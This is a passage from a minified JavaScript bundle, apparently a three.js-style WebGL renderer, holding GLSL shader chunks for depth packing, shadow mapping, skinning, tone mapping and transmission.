		return vec2( 0., 0. );
	if( v >= 1.0 )
		return vec2( 1., 1. );
	float vuf;
	float gf = modf( v * 256., vuf );
	return vec2( vuf * Inv255, gf );
}
float unpackRGBAToDepth( const in vec4 v ) {
	return dot( v, UnpackFactors4 );
}
float unpackRGBToDepth( const in vec3 v ) {
	return dot( v, UnpackFactors3 );
}
float unpackRGToDepth( const in vec2 v ) {
	return v.r * UnpackFactors2.r + v.g * UnpackFactors2.g;
}
vec4 pack2HalfToRGBA( const in vec2 v ) {
	vec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ) );
	return vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w );
}
vec2 unpackRGBATo2Half( const in vec4 v ) {
	return vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );
}
float viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {
	return ( viewZ + near ) / ( near - far );
}
float orthographicDepthToViewZ( const in float depth, const in float near, const in float far ) {
	#ifdef USE_REVERSED_DEPTH_BUFFER
	
		return depth * ( far - near ) - far;
	#else
		return depth * ( near - far ) - near;
	#endif
}
float viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {
	return ( ( near + viewZ ) * far ) / ( ( far - near ) * viewZ );
}
float perspectiveDepthToViewZ( const in float depth, const in float near, const in float far ) {
	
	#ifdef USE_REVERSED_DEPTH_BUFFER
		return ( near * far ) / ( ( near - far ) * depth - near );
	#else
		return ( near * far ) / ( ( far - near ) * depth - far );
	#endif
}`,m1=`#ifdef PREMULTIPLIED_ALPHA
	gl_FragColor.rgb *= gl_FragColor.a;
#endif`,g1=`vec4 mvPosition = vec4( transformed, 1.0 );
#ifdef USE_BATCHING
	mvPosition = batchingMatrix * mvPosition;
#endif
#ifdef USE_INSTANCING
	mvPosition = instanceMatrix * mvPosition;
#endif
mvPosition = modelViewMatrix * mvPosition;
gl_Position = projectionMatrix * mvPosition;`,_1=`#ifdef DITHERING
	gl_FragColor.rgb = dithering( gl_FragColor.rgb );
#endif`,v1=`#ifdef DITHERING
	vec3 dithering( vec3 color ) {
		float grid_position = rand( gl_FragCoord.xy );
		vec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );
		dither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );
		return color + dither_shift_RGB;
	}
#endif`,x1=`float roughnessFactor = roughness;
#ifdef USE_ROUGHNESSMAP
	vec4 texelRoughness = texture2D( roughnessMap, vRoughnessMapUv );
	roughnessFactor *= texelRoughness.g;
#endif`,S1=`#ifdef USE_ROUGHNESSMAP
	uniform sampler2D roughnessMap;
#endif`,y1=`#if NUM_SPOT_LIGHT_COORDS > 0
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#if NUM_SPOT_LIGHT_MAPS > 0
	uniform sampler2D spotLightMap[ NUM_SPOT_LIGHT_MAPS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_SUN_LIGHT_SHADOWS > 0
		#define SUN_LIGHT_CASCADES 2
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow sunShadowMap[ NUM_SUN_LIGHT_SHADOWS ];
		#else
			uniform sampler2D sunShadowMap[ NUM_SUN_LIGHT_SHADOWS ];
		#endif
		uniform mat4 sunShadowMatrix[ NUM_SUN_LIGHT_SHADOWS * SUN_LIGHT_CASCADES ];
		uniform vec4 sunShadowCascade[ NUM_SUN_LIGHT_SHADOWS * SUN_LIGHT_CASCADES ];
		varying vec4 vSunShadowWorldPosition;
		varying vec3 vSunShadowWorldNormal;
		struct SunLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SunLightShadow sunLightShadows[ NUM_SUN_LIGHT_SHADOWS ];
	#endif
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#else
			uniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#endif
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#else
			uniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#endif
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform samplerCubeShadow pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#elif defined( SHADOWMAP_TYPE_BASIC )
			uniform samplerCube pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#endif
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float interleavedGradientNoise( vec2 position ) {
			return fract( 52.9829189 * fract( dot( position, vec2( 0.06711056, 0.00583715 ) ) ) );
		}
		vec2 vogelDiskSample( int sampleIndex, int samplesCount, float phi ) {
			const float goldenAngle = 2.399963229728653;
			float r = sqrt( ( float( sampleIndex ) + 0.5 ) / float( samplesCount ) );
			float theta = float( sampleIndex ) * goldenAngle + phi;
			return vec2( cos( theta ), sin( theta ) ) * r;
		}
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float getShadow( sampler2DShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
				float radius = shadowRadius * texelSize.x;
				float phi = interleavedGradientNoise( gl_FragCoord.xy ) * PI2;
				shadow = (
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 0, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 1, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 2, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 3, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 4, 5, phi ) * radius, shadowCoord.z ) )
				) * 0.2;
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#elif defined( SHADOWMAP_TYPE_VSM )
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			#ifdef USE_REVERSED_DEPTH_BUFFER
				shadowCoord.z -= shadowBias;
			#else
				shadowCoord.z += shadowBias;
			#endif
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 distribution = texture2D( shadowMap, shadowCoord.xy ).rg;
				float mean = distribution.x;
				float variance = distribution.y * distribution.y;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					float hard_shadow = step( mean, shadowCoord.z );
				#else
					float hard_shadow = step( shadowCoord.z, mean );
				#endif
				
				if ( hard_shadow == 1.0 ) {
					shadow = 1.0;
				} else {
					variance = max( variance, 0.0000001 );
					float d = shadowCoord.z - mean;
					float p_max = variance / ( variance + d * d );
					p_max = clamp( ( p_max - 0.3 ) / 0.65, 0.0, 1.0 );
					shadow = max( hard_shadow, p_max );
				}
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#else
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			#ifdef USE_REVERSED_DEPTH_BUFFER
				shadowCoord.z -= shadowBias;
			#else
				shadowCoord.z += shadowBias;
			#endif
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				float depth = texture2D( shadowMap, shadowCoord.xy ).r;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					shadow = step( depth, shadowCoord.z );
				#else
					shadow = step( shadowCoord.z, depth );
				#endif
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#endif
	#if NUM_SUN_LIGHT_SHADOWS > 0
		float getSunShadow(
			#if defined( SHADOWMAP_TYPE_PCF )
				sampler2DShadow shadowMap,
			#else
				sampler2D shadowMap,
			#endif
			SunLightShadow sunLightShadow,
			int shadowIndex
		) {
			vec4 shadowWorldPosition = vec4( vSunShadowWorldPosition.xyz + vSunShadowWorldNormal * sunLightShadow.shadowNormalBias, 1.0 );
			float viewDepth = vSunShadowWorldPosition.w;
			int cascadeOffset = shadowIndex * SUN_LIGHT_CASCADES;
			float shadow = 1.0;
			for ( int i = SUN_LIGHT_CASCADES - 1; i >= 0; i -- ) {
				vec4 cascade = sunShadowCascade[ cascadeOffset + i ];
				if ( viewDepth >= cascade.x && viewDepth < cascade.y ) {
					float cascadeShadow = getShadow(
						shadowMap,
						sunLightShadow.shadowMapSize,
						sunLightShadow.shadowIntensity,
						sunLightShadow.shadowBias,
						sunLightShadow.shadowRadius,
						sunShadowMatrix[ cascadeOffset + i ] * shadowWorldPosition
					);
					shadow = mix( cascadeShadow, shadow, smoothstep( cascade.z, cascade.y, viewDepth ) );
				}
			}
			return shadow;
		}
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
	#if defined( SHADOWMAP_TYPE_PCF )
	float getPointShadow( samplerCubeShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 bd3D = normalize( lightToPosition );
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			#ifdef USE_REVERSED_DEPTH_BUFFER
				float dp = ( shadowCameraNear * ( shadowCameraFar - viewSpaceZ ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
				dp -= shadowBias;
			#else
				float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
				dp += shadowBias;
			#endif
			float texelSize = shadowRadius / shadowMapSize.x;
			vec3 absDir = abs( bd3D );
			vec3 tangent = absDir.x > absDir.z ? vec3( 0.0, 1.0, 0.0 ) : vec3( 1.0, 0.0, 0.0 );
			tangent = normalize( cross( bd3D, tangent ) );
			vec3 bitangent = cross( bd3D, tangent );
			float phi = interleavedGradientNoise( gl_FragCoord.xy ) * PI2;
			vec2 sample0 = vogelDiskSample( 0, 5, phi );
			vec2 sample1 = vogelDiskSample( 1, 5, phi );
			vec2 sample2 = vogelDiskSample( 2, 5, phi );
			vec2 sample3 = vogelDiskSample( 3, 5, phi );
			vec2 sample4 = vogelDiskSample( 4, 5, phi );
			shadow = (
				texture( shadowMap, vec4( bd3D + ( tangent * sample0.x + bitangent * sample0.y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * sample1.x + bitangent * sample1.y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * sample2.x + bitangent * sample2.y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * sample3.x + bitangent * sample3.y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * sample4.x + bitangent * sample4.y ) * texelSize, dp ) )
			) * 0.2;
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#elif defined( SHADOWMAP_TYPE_BASIC )
	float getPointShadow( samplerCube shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
			dp += shadowBias;
			vec3 bd3D = normalize( lightToPosition );
			float depth = textureCube( shadowMap, bd3D ).r;
			#ifdef USE_REVERSED_DEPTH_BUFFER
				depth = 1.0 - depth;
			#endif
			shadow = step( dp, depth );
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#endif
	#endif
#endif`,M1=`#if NUM_SPOT_LIGHT_COORDS > 0
	uniform mat4 spotLightMatrix[ NUM_SPOT_LIGHT_COORDS ];
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_SUN_LIGHT_SHADOWS > 0
		varying vec4 vSunShadowWorldPosition;
		varying vec3 vSunShadowWorldNormal;
	#endif
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
#endif`,E1=`#if ( defined( USE_SHADOWMAP ) && ( NUM_DIR_LIGHT_SHADOWS > 0 || NUM_SUN_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0 ) ) || ( NUM_SPOT_LIGHT_COORDS > 0 )
	#ifdef HAS_NORMAL
		vec3 shadowWorldNormal = transformNormalByInverseViewMatrix( transformedNormal, viewMatrix );
	#else
		vec3 shadowWorldNormal = vec3( 0.0 );
	#endif
	vec4 shadowWorldPosition;
#endif
#if defined( USE_SHADOWMAP )
	#if NUM_SUN_LIGHT_SHADOWS > 0
		vSunShadowWorldPosition = vec4( worldPosition.xyz, - mvPosition.z );
		vSunShadowWorldNormal = shadowWorldNormal;
	#endif
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );
			vDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );
			vPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
#endif
#if NUM_SPOT_LIGHT_COORDS > 0
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_COORDS; i ++ ) {
		shadowWorldPosition = worldPosition;
		#if ( defined( USE_SHADOWMAP ) && UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
			shadowWorldPosition.xyz += shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias;
		#endif
		vSpotLightCoord[ i ] = spotLightMatrix[ i ] * shadowWorldPosition;
	}
	#pragma unroll_loop_end
#endif`,b1=`float getShadowMask() {
	float shadow = 1.0;
	#ifdef USE_SHADOWMAP
	#if NUM_SUN_LIGHT_SHADOWS > 0
	SunLightShadow sunLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SUN_LIGHT_SHADOWS; i ++ ) {
		sunLight = sunLightShadows[ i ];
		shadow *= receiveShadow ? getSunShadow( sunShadowMap[ i ], sunLight, UNROLLED_LOOP_INDEX ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
		directionalLight = directionalLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowIntensity, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {
		spotLight = spotLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowIntensity, spotLight.shadowBias, spotLight.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0 && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
	PointLightShadow pointLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
		pointLight = pointLightShadows[ i ];
		shadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowIntensity, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#endif
	return shadow;
}`,T1=`#ifdef USE_SKINNING
	mat4 boneMatX = getBoneMatrix( skinIndex.x );
	mat4 boneMatY = getBoneMatrix( skinIndex.y );
	mat4 boneMatZ = getBoneMatrix( skinIndex.z );
	mat4 boneMatW = getBoneMatrix( skinIndex.w );
#endif`,A1=`#ifdef USE_SKINNING
	uniform mat4 bindMatrix;
	uniform mat4 bindMatrixInverse;
	uniform highp sampler2D boneTexture;
	mat4 getBoneMatrix( const in float i ) {
		int size = textureSize( boneTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( boneTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( boneTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( boneTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( boneTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,R1=`#ifdef USE_SKINNING
	vec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );
	vec4 skinned = vec4( 0.0 );
	skinned += boneMatX * skinVertex * skinWeight.x;
	skinned += boneMatY * skinVertex * skinWeight.y;
	skinned += boneMatZ * skinVertex * skinWeight.z;
	skinned += boneMatW * skinVertex * skinWeight.w;
	transformed = ( bindMatrixInverse * skinned ).xyz;
#endif`,C1=`#ifdef USE_SKINNING
	mat4 skinMatrix = mat4( 0.0 );
	skinMatrix += skinWeight.x * boneMatX;
	skinMatrix += skinWeight.y * boneMatY;
	skinMatrix += skinWeight.z * boneMatZ;
	skinMatrix += skinWeight.w * boneMatW;
	skinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;
	objectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;
	#ifdef USE_TANGENT
		objectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;
	#endif
#endif`,w1=`float specularStrength;
#ifdef USE_SPECULARMAP
	vec4 texelSpecular = texture2D( specularMap, vSpecularMapUv );
	specularStrength = texelSpecular.r;
#else
	specularStrength = 1.0;
#endif`,N1=`#ifdef USE_SPECULARMAP
	uniform sampler2D specularMap;
#endif`,D1=`#if defined( TONE_MAPPING )
	gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );
#endif`,U1=`#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
uniform float toneMappingExposure;
vec3 LinearToneMapping( vec3 color ) {
	return saturate( toneMappingExposure * color );
}
vec3 ReinhardToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	return saturate( color / ( vec3( 1.0 ) + color ) );
}
vec3 CineonToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	color = max( vec3( 0.0 ), color - 0.004 );
	return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );
}
vec3 RRTAndODTFit( vec3 v ) {
	vec3 a = v * ( v + 0.0245786 ) - 0.000090537;
	vec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;
	return a / b;
}
vec3 ACESFilmicToneMapping( vec3 color ) {
	const mat3 ACESInputMat = mat3(
		vec3( 0.59719, 0.07600, 0.02840 ),		vec3( 0.35458, 0.90834, 0.13383 ),
		vec3( 0.04823, 0.01566, 0.83777 )
	);
	const mat3 ACESOutputMat = mat3(
		vec3(  1.60475, -0.10208, -0.00327 ),		vec3( -0.53108,  1.10813, -0.07276 ),
		vec3( -0.07367, -0.00605,  1.07602 )
	);
	color *= toneMappingExposure / 0.6;
	color = ACESInputMat * color;
	color = RRTAndODTFit( color );
	color = ACESOutputMat * color;
	return saturate( color );
}
const mat3 LINEAR_REC2020_TO_LINEAR_SRGB = mat3(
	vec3( 1.6605, - 0.1246, - 0.0182 ),
	vec3( - 0.5876, 1.1329, - 0.1006 ),
	vec3( - 0.0728, - 0.0083, 1.1187 )
);
const mat3 LINEAR_SRGB_TO_LINEAR_REC2020 = mat3(
	vec3( 0.6274, 0.0691, 0.0164 ),
	vec3( 0.3293, 0.9195, 0.0880 ),
	vec3( 0.0433, 0.0113, 0.8956 )
);
vec3 agxDefaultContrastApprox( vec3 x ) {
	vec3 x2 = x * x;
	vec3 x4 = x2 * x2;
	return + 15.5 * x4 * x2
		- 40.14 * x4 * x
		+ 31.96 * x4
		- 6.868 * x2 * x
		+ 0.4298 * x2
		+ 0.1191 * x
		- 0.00232;
}
vec3 AgXToneMapping( vec3 color ) {
	const mat3 AgXInsetMatrix = mat3(
		vec3( 0.856627153315983, 0.137318972929847, 0.11189821299995 ),
		vec3( 0.0951212405381588, 0.761241990602591, 0.0767994186031903 ),
		vec3( 0.0482516061458583, 0.101439036467562, 0.811302368396859 )
	);
	const mat3 AgXOutsetMatrix = mat3(
		vec3( 1.1271005818144368, - 0.1413297634984383, - 0.14132976349843826 ),
		vec3( - 0.11060664309660323, 1.157823702216272, - 0.11060664309660294 ),
		vec3( - 0.016493938717834573, - 0.016493938717834257, 1.2519364065950405 )
	);
	const float AgxMinEv = - 12.47393;	const float AgxMaxEv = 4.026069;
	color *= toneMappingExposure;
	color = LINEAR_SRGB_TO_LINEAR_REC2020 * color;
	color = AgXInsetMatrix * color;
	color = max( color, 1e-10 );	color = log2( color );
	color = ( color - AgxMinEv ) / ( AgxMaxEv - AgxMinEv );
	color = clamp( color, 0.0, 1.0 );
	color = agxDefaultContrastApprox( color );
	color = AgXOutsetMatrix * color;
	color = pow( max( vec3( 0.0 ), color ), vec3( 2.2 ) );
	color = LINEAR_REC2020_TO_LINEAR_SRGB * color;
	color = clamp( color, 0.0, 1.0 );
	return color;
}
vec3 NeutralToneMapping( vec3 color ) {
	const float StartCompression = 0.8 - 0.04;
	const float Desaturation = 0.15;
	color *= toneMappingExposure;
	float x = min( color.r, min( color.g, color.b ) );
	float offset = x < 0.08 ? x - 6.25 * x * x : 0.04;
	color -= offset;
	float peak = max( color.r, max( color.g, color.b ) );
	if ( peak < StartCompression ) return color;
	float d = 1. - StartCompression;
	float newPeak = 1. - d * d / ( peak + d - StartCompression );
	color *= newPeak / peak;
	float g = 1. - 1. / ( Desaturation * ( peak - newPeak ) + 1. );
	return mix( color, vec3( newPeak ), g );
}
vec3 CustomToneMapping( vec3 color ) { return color; }`,L1=`#ifdef USE_TRANSMISSION
	material.transmission = transmission;
	material.transmissionAlpha = 1.0;
	material.thickness = thickness;
	material.attenuationDistance = attenuationDistance;
	material.attenuationColor = attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		material.transmission *= texture2D( transmissionMap, vTransmissionMapUv ).r;
	#endif
	#ifdef USE_THICKNESSMAP
		material.thickness *= texture2D( thicknessMap, vThicknessMapUv ).g;
	#endif
	vec3 pos = vWorldPosition;
	vec3 v = normalize( cameraPosition - pos );
	vec3 n = transformNormalByInverseViewMatrix( normal, viewMatrix );
	vec4 transmitted = getIBLVolumeRefraction(
		n, v, material.roughness, material.diffuseContribution, material.specularColorBlended, material.specularF90,
		pos, modelMatrix, viewMatrix, projectionMatrix, material.dispersion, material.ior, material.thickness,
		material.attenuationColor, material.attenuationDistance );
	material.transmissionAlpha = mix( material.transmissionAlpha, transmitted.a, material.transmission );
	totalDiffuse = mix( totalDiffuse, transmitted.rgb, material.transmission );
#endif`,O1=`#ifdef USE_TRANSMISSION
	uniform float transmission;
	uniform float thickness;
	uniform float attenuationDistance;
	uniform vec3 attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		uniform sampler2D transmissionMap;
	#endif
	#ifdef USE_THICKNESSMAP
		uniform sampler2D thicknessMap;
	#endif
	uniform vec2 transmissionSamplerSize;
	uniform sampler2D transmissionSamplerMap;
	uniform mat4 modelMatrix;
	uniform mat4 projectionMatrix;
	varying vec3 vWorldPosition;
	float w0( float a ) {
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - a + 3.0 ) - 3.0 ) + 1.0 );
	}
	float w1( float a ) {
		return ( 1.0 / 6.0 ) * ( a *  a * ( 3.0 * a - 6.0 ) + 4.0 );
	}
	float w2( float a ){
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - 3.0 * a + 3.0 ) + 3.0 ) + 1.0 );
	}
	float w3( float a ) {
		return ( 1.0 / 6.0 ) * ( a * a * a );
	}
	float g0( float a ) {
		return w0( a ) + w1( a );
	}
	float g1( float a ) {
		return w2( a ) + w3( a );
	}
	float h0( float a ) {
		return - 1.0 + w1( a ) / ( w0( a ) + w1( a ) );
	}
	float h1( float a ) {
		return 1.0 + w3( a ) / ( w2( a ) + w3( a ) );
	}
	vec4 bicubic( sampler2D tex, vec2 uv, vec4 texelSize, float lod ) {
		uv = uv * texelSize.zw + 0.5;
		vec2 iuv = floor( uv );
		vec2 fuv = fract( uv );
		float g0x = g0( fuv.x );
		float g1x = g1( fuv.x );
		float h0x = h0( fuv.x );
		float h1x = h1( fuv.x );
		float h0y = h0( fuv.y );
		float h1y = h1( fuv.y );
		vec2 p0 = ( vec2( iuv.x + h0x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p1 = ( vec2( iuv.x + h1x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p2 = ( vec2( iuv.x + h0x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		vec2 p3 = ( vec2( iuv.x + h1x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		return g0( fuv.y ) * ( g0x * textureLod( tex, p0, lod ) + g1x * textureLod( tex, p1, lod ) ) +
